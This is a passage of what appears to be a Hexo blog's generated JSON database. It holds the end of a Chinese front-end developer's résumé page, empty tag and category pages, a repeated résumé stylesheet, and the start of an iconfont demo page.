项目描述：完成多个功能的小应用开发，包括预约、详情、评价、内容介绍等任务\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、改造vue-cli，使用postcss相关插件完成移动端的适配\n          </p>\n          <p class=\"values\">\n            2、根据业务需求完成公共组件，包括日历选择组件，时间颗粒度选择组件，证件弹框组件等\n          </p>\n          <p class=\"values\">\n            3、通过 vue-router 的生命周期钩子判断不同入口的页面返回以及跳转，并且在该页面销毁时将数 据保存在vuex中\n          </p>\n          <p class=\"values\">\n            4、通过 js 和原生交互，实现原生向页面注数据，以及 js 调取原生的相机、地图、电话等组件，并 且实现页面埋点，统计访问数据\n          </p>\n          <p class=\"values\">5、配合产品完成页面功能改进，提升用户体检</p>\n        </div>\n      </div>\n      <br>\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">牙牙预约：2019.3 - 2019.5</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：牙牙预约为客户提供牙齿健康预约服务，进行Vue多页面开发，在不同平台有不同的样式风格，以及不同渠道的预约门店等不同\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、将老项目代码从SVN移植到GitLab；相似渠道代码归并，减少代码量</p>\n          <p class=\"values\">2、根据业务需求重构代码，便于用于新渠道开发</p>\n          <p class=\"values\">3、重写并替换项目冗余组件，便于项目维护和移植</p>\n          <p class=\"values\">4、调用高德、腾讯等地图组件，实现定位功能</p>\n          <p class=\"values\">5、配合后端同事完成数据优化以及实现新需求</p>\n        </div>\n      </div>\n      <br>\n      <!-- 2222222222222222222 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">富通App：2018.9 – 2019.2</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：富通App是一款供保险代理人使用，向代理人提供竞赛、预约、宣传、业绩查询、消 息接收等功能\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、根据UI提供的设计稿转换为适配移动端的H5页面</p>\n          <p class=\"values\">2、通过webview实现js与原生交互，让内嵌H5可以调用客户端的原生方法</p>\n          <p class=\"values\">3、在APP中，通过videojs实现视频播放，以及使用echarts实现数据可视化</p>\n          <p class=\"values\">4、开发前端通用的按钮组件、弹框组件和日历组件</p>\n          <p class=\"values\">5、webpack打包优化，以及后期的性能优化等</p>\n        </div>\n      </div>\n      <br>\n      <!-- 33333333333 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">IPF摄影器材租赁系统：2018.1 – 2018.8</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：IPF摄影器材租赁系统是一款后端管理平台，向用户租赁各种摄影器材，主要包括登录、商品管理、用户管理、订单管理等。\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、负责web产品页面制作，根据产品需求，制定管理系统的UI风格，实现用户交互的效果；\n          </p>\n          <p class=\"values\">\n            2、持续优化前端体验和页面响应速度，提升web界面友好易用；\n          </p>\n          <p class=\"values\">\n            3、与产品经理、UI设计师及开发经理沟通，理解需求，进行敏捷开发、持续交付和验证；\n          </p>\n          <p class=\"values\">\n            4、完成一些推广的H5页面，如活动介绍，公司月报总结等；\n          </p>\n          <p class=\"values\">\n            5、帮助其他同事进行部分页面的调试，负责后期的性能优化。\n          </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 自我评价 -->\n    <div id=\"res-skill\" class=\"res-skill footer\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          自我评价\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 一、</span> -->\n          <span class=\"values\">\n            本人性格开朗，有良好的沟通能力和团队协作精神，具有良好的业务理解能力，能够独立解决工作中遇到的问题；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 二、</span> -->\n          <span class=\"values\">\n            热爱编程，喜欢专研新技术，不断突破技术瓶颈，遇到问题一查到底，乐于记笔记、写博客；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 三、</span> -->\n          <span class=\"values\">\n            喜欢前端，热爱互联网行业，关注前沿技术，能够保持不断学习的决心和动力。\n          </span>\n        </div>\n      </div>\n    </div>\n\n    <!-- <script src=\"assets/jquery/jquery.1.12.4.min.js\"></script>\n    <script src=\"assets/bootstrap/js/bootstrap.min.js\"></script> -->\n    <script src=\"https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js\"></script>\n    <!-- <script src=\"js/index.js\"></script> -->\n  </body>\n</html>\n"},{"title":"Tagcloud","date":"2017-04-26T09:47:43.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: Tagcloud\ndate: 2017-04-26 17:47:43\ntype: \"tags\"\nlayout: \"tags\"\n---","updated":"2020-06-18T07:09:21.448Z","path":"tags/index.html","comments":1,"_id":"ckclr4u5t000xqrwtr4ud5a13","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Categoriescloud","date":"2017-04-26T09:47:43.000Z","type":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: Categoriescloud\ndate: 2017-04-26 17:47:43\ntype: \"categories\"\nlayout: \"categories\"\n---","updated":"2020-06-18T07:09:21.445Z","path":"categories/index.html","comments":1,"_id":"ckclr4u5u0011qrwt3106imx7","content":"","site":{"data":{}},"excerpt":"","more":""},{"_content":"body {\n  background-color: #eeeeee;\n  padding-top: 50px;\n  margin: 20px 0;\n  padding: 0;\n}\np {\n  margin: 0;\n  padding: 0;\n}\n/* 导航栏 */\n.res-navbar {\n  border: none;\n  margin-bottom: 10px;\n  border-bottom: 1px solid #777777;\n}\n.res-navbar .navbar-brand {\n  margin-top: 5px;\n  color: #777;\n}\n.res-navbar .navbar-brand .icon-zhaopin {\n  font-size: 48px;\n  color: #6ac6db;\n}\n.res-navbar .navbar-brand:hover,\n.res-navbar .navbar-brand:focus {\n  color: #5e5e5e;\n  background-color: transparent;\n}\n.res-navbar .navbar-text {\n  color: #777;\n}\n.res-navbar .navbar-nav > li > a {\n  color: #777;\n  height: 40px;\n  line-height: 27px;\n  padding: 5px 15px;\n}\n.res-navbar .navbar-nav > li > a:hover,\n.res-navbar .navbar-nav > li > a:focus {\n  color: #333;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .active > a,\n.res-navbar .navbar-nav > .active > a:hover,\n.res-navbar .navbar-nav > .active > a:focus {\n  color: #555;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .disabled > a,\n.res-navbar .navbar-nav > .disabled > a:hover,\n.res-navbar .navbar-nav > .disabled > a:focus {\n  color: #ccc;\n  background-color: transparent;\n}\n.res-navbar .navbar-toggle {\n  border-color: #ddd;\n  margin-top: 18px;\n}\n.res-navbar .navbar-toggle:hover,\n.res-navbar .navbar-toggle:focus {\n  background-color: #ddd;\n}\n.res-navbar .navbar-toggle .icon-bar {\n  background-color: #888;\n}\n.res-navbar .navbar-collapse,\n.res-navbar .navbar-form {\n  border-color: #e7e7e7;\n}\n.res-navbar .navbar-nav > .open > a,\n.res-navbar .navbar-nav > .open > a:hover,\n.res-navbar .navbar-nav > .open > a:focus {\n  color: #555;\n  background-color: #e7e7e7;\n}\n@media (max-width: 767px) {\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a {\n    color: #777;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:focus {\n    color: #333;\n    background-color: transparent;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:focus {\n    color: #555;\n    background-color: #e7e7e7;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:focus {\n    color: #ccc;\n    background-color: transparent;\n  }\n}\n.res-navbar .navbar-link {\n  color: #777;\n}\n.res-navbar .navbar-link:hover {\n  color: #333;\n}\n.res-navbar .btn-link {\n  color: #777;\n}\n.res-navbar .btn-link:hover,\n.res-navbar .btn-link:focus {\n  color: #333;\n}\n.res-navbar .btn-link[disabled]:hover,\nfieldset[disabled] .res-navbar .btn-link:hover,\n.res-navbar .btn-link[disabled]:focus,\nfieldset[disabled] .res-navbar .btn-link:focus {\n  color: #ccc;\n}\n/* 个人介绍 */\n.res-introduce {\n  padding: 10px 0;\n  border: 1px solid #6ac6db;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n  border-radius: 5px;\n}\n.res-introduce .row {\n  color: #333333;\n}\n.res-introduce .row:first-child {\n  padding: 0;\n}\n.res-introduce .row:first-child .avatar-box .my-avatar {\n  display: block;\n  margin: 0 auto;\n  height: 160px;\n}\n.res-introduce .my-info .row {\n  height: 32px;\n  line-height: 32px;\n  margin: 2px 0;\n}\n/* 技能区域 & 自我评价 */\n.res-skill {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-skill .row:first-child {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-skill .row:first-child .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-skill .row {\n  padding: 5px;\n}\n.res-skill .row .glyphicon-hand-right {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-skill .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n  padding-left: 5px;\n}\n.res-skill .row .values {\n  padding: 5px 0;\n  color: #222222;\n}\n/* 工作经历 项目经验 */\n.res-company {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-company .sub-title {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-company .sub-title .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-company .row {\n  padding: 3px 5px;\n}\n.res-company .row .glyphicon-time,\n.res-company .row .glyphicon-lock,\n.res-company .row .glyphicon-saved {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-company .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n}\n.res-company .row .values {\n  padding: 2px 0px 2px 15px;\n  color: #222222;\n}\n.footer {\n  margin-bottom: 20px;\n}\n","source":"hireme/css/index.css","raw":"body {\n  background-color: #eeeeee;\n  padding-top: 50px;\n  margin: 20px 0;\n  padding: 0;\n}\np {\n  margin: 0;\n  padding: 0;\n}\n/* 导航栏 */\n.res-navbar {\n  border: none;\n  margin-bottom: 10px;\n  border-bottom: 1px solid #777777;\n}\n.res-navbar .navbar-brand {\n  margin-top: 5px;\n  color: #777;\n}\n.res-navbar .navbar-brand .icon-zhaopin {\n  font-size: 48px;\n  color: #6ac6db;\n}\n.res-navbar .navbar-brand:hover,\n.res-navbar .navbar-brand:focus {\n  color: #5e5e5e;\n  background-color: transparent;\n}\n.res-navbar .navbar-text {\n  color: #777;\n}\n.res-navbar .navbar-nav > li > a {\n  color: #777;\n  height: 40px;\n  line-height: 27px;\n  padding: 5px 15px;\n}\n.res-navbar .navbar-nav > li > a:hover,\n.res-navbar .navbar-nav > li > a:focus {\n  color: #333;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .active > a,\n.res-navbar .navbar-nav > .active > a:hover,\n.res-navbar .navbar-nav > .active > a:focus {\n  color: #555;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .disabled > a,\n.res-navbar .navbar-nav > .disabled > a:hover,\n.res-navbar .navbar-nav > .disabled > a:focus {\n  color: #ccc;\n  background-color: transparent;\n}\n.res-navbar .navbar-toggle {\n  border-color: #ddd;\n  margin-top: 18px;\n}\n.res-navbar .navbar-toggle:hover,\n.res-navbar .navbar-toggle:focus {\n  background-color: #ddd;\n}\n.res-navbar .navbar-toggle .icon-bar {\n  background-color: #888;\n}\n.res-navbar .navbar-collapse,\n.res-navbar .navbar-form {\n  border-color: #e7e7e7;\n}\n.res-navbar .navbar-nav > .open > a,\n.res-navbar .navbar-nav > .open > a:hover,\n.res-navbar .navbar-nav > .open > a:focus {\n  color: #555;\n  background-color: #e7e7e7;\n}\n@media (max-width: 767px) {\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a {\n    color: #777;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:focus {\n    color: #333;\n    background-color: transparent;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:focus {\n    color: #555;\n    background-color: #e7e7e7;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:focus {\n    color: #ccc;\n    background-color: transparent;\n  }\n}\n.res-navbar .navbar-link {\n  color: #777;\n}\n.res-navbar .navbar-link:hover {\n  color: #333;\n}\n.res-navbar .btn-link {\n  color: #777;\n}\n.res-navbar .btn-link:hover,\n.res-navbar .btn-link:focus {\n  color: #333;\n}\n.res-navbar .btn-link[disabled]:hover,\nfieldset[disabled] .res-navbar .btn-link:hover,\n.res-navbar .btn-link[disabled]:focus,\nfieldset[disabled] .res-navbar .btn-link:focus {\n  color: #ccc;\n}\n/* 个人介绍 */\n.res-introduce {\n  padding: 10px 0;\n  border: 1px solid #6ac6db;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n  border-radius: 5px;\n}\n.res-introduce .row {\n  color: #333333;\n}\n.res-introduce .row:first-child {\n  padding: 0;\n}\n.res-introduce .row:first-child .avatar-box .my-avatar {\n  display: block;\n  margin: 0 auto;\n  height: 160px;\n}\n.res-introduce .my-info .row {\n  height: 32px;\n  line-height: 32px;\n  margin: 2px 0;\n}\n/* 技能区域 & 自我评价 */\n.res-skill {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-skill .row:first-child {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-skill .row:first-child .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-skill .row {\n  padding: 5px;\n}\n.res-skill .row .glyphicon-hand-right {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-skill .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n  padding-left: 5px;\n}\n.res-skill .row .values {\n  padding: 5px 0;\n  color: #222222;\n}\n/* 工作经历 项目经验 */\n.res-company {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-company .sub-title {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-company .sub-title .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-company .row {\n  padding: 3px 5px;\n}\n.res-company .row .glyphicon-time,\n.res-company .row .glyphicon-lock,\n.res-company .row .glyphicon-saved {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-company .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n}\n.res-company .row .values {\n  padding: 2px 0px 2px 15px;\n  color: #222222;\n}\n.footer {\n  margin-bottom: 20px;\n}\n","date":"2020-06-18T07:09:21.445Z","updated":"2020-06-18T07:09:21.445Z","path":"hireme/css/index.css","layout":"false","title":"","comments":1,"_id":"ckclr4u6j001fqrwtx0qz3nzk","content":"body {\n  background-color: #eeeeee;\n  padding-top: 50px;\n  margin: 20px 0;\n  padding: 0;\n}\np {\n  margin: 0;\n  padding: 0;\n}\n/* 导航栏 */\n.res-navbar {\n  border: none;\n  margin-bottom: 10px;\n  border-bottom: 1px solid #777777;\n}\n.res-navbar .navbar-brand {\n  margin-top: 5px;\n  color: #777;\n}\n.res-navbar .navbar-brand .icon-zhaopin {\n  font-size: 48px;\n  color: #6ac6db;\n}\n.res-navbar .navbar-brand:hover,\n.res-navbar .navbar-brand:focus {\n  color: #5e5e5e;\n  background-color: transparent;\n}\n.res-navbar .navbar-text {\n  color: #777;\n}\n.res-navbar .navbar-nav > li > a {\n  color: #777;\n  height: 40px;\n  line-height: 27px;\n  padding: 5px 15px;\n}\n.res-navbar .navbar-nav > li > a:hover,\n.res-navbar .navbar-nav > li > a:focus {\n  color: #333;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .active > a,\n.res-navbar .navbar-nav > .active > a:hover,\n.res-navbar .navbar-nav > .active > a:focus {\n  color: #555;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .disabled > a,\n.res-navbar .navbar-nav > .disabled > a:hover,\n.res-navbar .navbar-nav > .disabled > a:focus {\n  color: #ccc;\n  background-color: transparent;\n}\n.res-navbar .navbar-toggle {\n  border-color: #ddd;\n  margin-top: 18px;\n}\n.res-navbar .navbar-toggle:hover,\n.res-navbar .navbar-toggle:focus {\n  background-color: #ddd;\n}\n.res-navbar .navbar-toggle .icon-bar {\n  background-color: #888;\n}\n.res-navbar .navbar-collapse,\n.res-navbar .navbar-form {\n  border-color: #e7e7e7;\n}\n.res-navbar .navbar-nav > .open > a,\n.res-navbar .navbar-nav > .open > a:hover,\n.res-navbar .navbar-nav > .open > a:focus {\n  color: #555;\n  background-color: #e7e7e7;\n}\n@media (max-width: 767px) {\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a {\n    color: #777;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:focus {\n    color: #333;\n    background-color: transparent;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:focus {\n    color: #555;\n    background-color: #e7e7e7;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:focus {\n    color: #ccc;\n    background-color: transparent;\n  }\n}\n.res-navbar .navbar-link {\n  color: #777;\n}\n.res-navbar .navbar-link:hover {\n  color: #333;\n}\n.res-navbar .btn-link {\n  color: #777;\n}\n.res-navbar .btn-link:hover,\n.res-navbar .btn-link:focus {\n  color: #333;\n}\n.res-navbar .btn-link[disabled]:hover,\nfieldset[disabled] .res-navbar .btn-link:hover,\n.res-navbar .btn-link[disabled]:focus,\nfieldset[disabled] .res-navbar .btn-link:focus {\n  color: #ccc;\n}\n/* 个人介绍 */\n.res-introduce {\n  padding: 10px 0;\n  border: 1px solid #6ac6db;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n  border-radius: 5px;\n}\n.res-introduce .row {\n  color: #333333;\n}\n.res-introduce .row:first-child {\n  padding: 0;\n}\n.res-introduce .row:first-child .avatar-box .my-avatar {\n  display: block;\n  margin: 0 auto;\n  height: 160px;\n}\n.res-introduce .my-info .row {\n  height: 32px;\n  line-height: 32px;\n  margin: 2px 0;\n}\n/* 技能区域 & 自我评价 */\n.res-skill {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-skill .row:first-child {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-skill .row:first-child .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-skill .row {\n  padding: 5px;\n}\n.res-skill .row .glyphicon-hand-right {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-skill .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n  padding-left: 5px;\n}\n.res-skill .row .values {\n  padding: 5px 0;\n  color: #222222;\n}\n/* 工作经历 项目经验 */\n.res-company {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-company .sub-title {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-company .sub-title .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-company .row {\n  padding: 3px 5px;\n}\n.res-company .row .glyphicon-time,\n.res-company .row .glyphicon-lock,\n.res-company .row .glyphicon-saved {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-company .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n}\n.res-company .row .values {\n  padding: 2px 0px 2px 15px;\n  color: #222222;\n}\n.footer {\n  margin-bottom: 20px;\n}\n","site":{"data":{}},"excerpt":"","more":"body {\n  background-color: #eeeeee;\n  padding-top: 50px;\n  margin: 20px 0;\n  padding: 0;\n}\np {\n  margin: 0;\n  padding: 0;\n}\n/* 导航栏 */\n.res-navbar {\n  border: none;\n  margin-bottom: 10px;\n  border-bottom: 1px solid #777777;\n}\n.res-navbar .navbar-brand {\n  margin-top: 5px;\n  color: #777;\n}\n.res-navbar .navbar-brand .icon-zhaopin {\n  font-size: 48px;\n  color: #6ac6db;\n}\n.res-navbar .navbar-brand:hover,\n.res-navbar .navbar-brand:focus {\n  color: #5e5e5e;\n  background-color: transparent;\n}\n.res-navbar .navbar-text {\n  color: #777;\n}\n.res-navbar .navbar-nav > li > a {\n  color: #777;\n  height: 40px;\n  line-height: 27px;\n  padding: 5px 15px;\n}\n.res-navbar .navbar-nav > li > a:hover,\n.res-navbar .navbar-nav > li > a:focus {\n  color: #333;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .active > a,\n.res-navbar .navbar-nav > .active > a:hover,\n.res-navbar .navbar-nav > .active > a:focus {\n  color: #555;\n  background-color: transparent;\n  border-bottom: 3px solid #6ac6db;\n}\n.res-navbar .navbar-nav > .disabled > a,\n.res-navbar .navbar-nav > .disabled > a:hover,\n.res-navbar .navbar-nav > .disabled > a:focus {\n  color: #ccc;\n  background-color: transparent;\n}\n.res-navbar .navbar-toggle {\n  border-color: #ddd;\n  margin-top: 18px;\n}\n.res-navbar .navbar-toggle:hover,\n.res-navbar .navbar-toggle:focus {\n  background-color: #ddd;\n}\n.res-navbar .navbar-toggle .icon-bar {\n  background-color: #888;\n}\n.res-navbar .navbar-collapse,\n.res-navbar .navbar-form {\n  border-color: #e7e7e7;\n}\n.res-navbar .navbar-nav > .open > a,\n.res-navbar .navbar-nav > .open > a:hover,\n.res-navbar .navbar-nav > .open > a:focus {\n  color: #555;\n  background-color: #e7e7e7;\n}\n@media (max-width: 767px) {\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a {\n    color: #777;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > li > a:focus {\n    color: #333;\n    background-color: transparent;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .active > a:focus {\n    color: #555;\n    background-color: #e7e7e7;\n  }\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:hover,\n  .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:focus {\n    color: #ccc;\n    background-color: transparent;\n  }\n}\n.res-navbar .navbar-link {\n  color: #777;\n}\n.res-navbar .navbar-link:hover {\n  color: #333;\n}\n.res-navbar .btn-link {\n  color: #777;\n}\n.res-navbar .btn-link:hover,\n.res-navbar .btn-link:focus {\n  color: #333;\n}\n.res-navbar .btn-link[disabled]:hover,\nfieldset[disabled] .res-navbar .btn-link:hover,\n.res-navbar .btn-link[disabled]:focus,\nfieldset[disabled] .res-navbar .btn-link:focus {\n  color: #ccc;\n}\n/* 个人介绍 */\n.res-introduce {\n  padding: 10px 0;\n  border: 1px solid #6ac6db;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n  border-radius: 5px;\n}\n.res-introduce .row {\n  color: #333333;\n}\n.res-introduce .row:first-child {\n  padding: 0;\n}\n.res-introduce .row:first-child .avatar-box .my-avatar {\n  display: block;\n  margin: 0 auto;\n  height: 160px;\n}\n.res-introduce .my-info .row {\n  height: 32px;\n  line-height: 32px;\n  margin: 2px 0;\n}\n/* 技能区域 & 自我评价 */\n.res-skill {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-skill .row:first-child {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-skill .row:first-child .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-skill .row {\n  padding: 5px;\n}\n.res-skill .row .glyphicon-hand-right {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-skill .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n  padding-left: 5px;\n}\n.res-skill .row .values {\n  padding: 5px 0;\n  color: #222222;\n}\n/* 工作经历 项目经验 */\n.res-company {\n  margin-top: 10px;\n  padding: 5px 0;\n  border: 1px solid #6ac6db;\n  border-radius: 5px;\n  box-shadow: inset 0px 0px 10px 0px #6ac6db;\n}\n.res-company .sub-title {\n  height: 32px;\n  line-height: 32px;\n  font-size: 18px;\n}\n.res-company .sub-title .glyphicon-tag {\n  padding-left: 5px;\n  color: #6bc4d9;\n}\n.res-company .row {\n  padding: 3px 5px;\n}\n.res-company .row .glyphicon-time,\n.res-company .row .glyphicon-lock,\n.res-company .row .glyphicon-saved {\n  margin-left: 10px;\n  color: #6bc4d9;\n}\n.res-company .row .items {\n  color: #333333;\n  letter-spacing: 1px;\n  font-weight: 600;\n}\n.res-company .row .values {\n  padding: 2px 0px 2px 15px;\n  color: #222222;\n}\n.footer {\n  margin-bottom: 20px;\n}\n"},{"_content":"<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\"/>\n  <title>IconFont Demo</title>\n  <link rel=\"shortcut icon\" href=\"https://gtms04.alicdn.com/tps/i4/TB1_oz6GVXXXXaFXpXXJDFnIXXX-64-64.ico\" type=\"image/x-icon\"/>\n  <link rel=\"stylesheet\" href=\"https://g.alicdn.com/thx/cube/1.3.2/cube.min.css\">\n  <link rel=\"stylesheet\" href=\"demo.css\">\n  <link rel=\"stylesheet\" href=\"iconfont.css\">\n  <script src=\"iconfont.js\"></script>\n  <!-- jQuery -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/7bfddb60-08e8-11e9-9b04-53e73bb6408b.js\"></script>\n  <!-- 代码高亮 -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/a3f714d0-08e6-11e9-8a15-ebf944d7534c.js\"></script>\n</head>\n<body>\n  <div class=\"main\">\n    <h1 class=\"logo\"><a href=\"https://www.iconfont.cn/\" title=\"iconfont 首页\" 